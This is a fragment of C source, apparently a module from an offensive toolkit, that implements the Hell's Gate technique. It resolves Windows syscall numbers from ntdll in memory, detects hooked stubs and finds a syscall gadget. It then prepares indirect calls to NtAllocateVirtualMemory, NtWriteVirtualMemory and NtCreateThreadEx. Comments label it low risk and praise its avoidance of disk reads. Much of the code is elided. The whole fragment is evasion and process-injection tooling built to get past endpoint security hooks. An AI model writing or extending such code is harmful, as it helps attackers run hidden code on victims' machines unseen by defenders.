...
// headers: windows.h
// risk: low
// note: Hell's Gate — resolves SSNs from in-memory ntdll export table. No disk reads. Falls back gracefully if function is hooked.

#ifndef CHUNK_HELLS_GATE
#define CHUNK_HELLS_GATE
...
static DWORD hg_resolve_ssn(HMODULE ntdll, const char *func_name) {
    ...
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        ...
        if (strcmp(name, func_name) == 0) {
            ...
            // Unhooking check: standard Nt stub starts with
...
static void *hg_find_gadget(HMODULE ntdll) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
...
static int init_indirect_syscalls(void) {
    ...
    ssn_NtAllocateVirtualMemory = hg_resolve_ssn(ntdll, "NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory    = hg_resolve_ssn(ntdll, "NtWriteVirtualMemory");
    ssn_NtCreateThreadEx        = hg_resolve_ssn(ntdll, "NtCreateThreadEx");
    ssn_NtQuerySystemInformation = hg_resolve_ssn(ntdll, "NtQuerySystemInformation");
    syscall_ret_gadget = hg_find_gadget(ntdll);
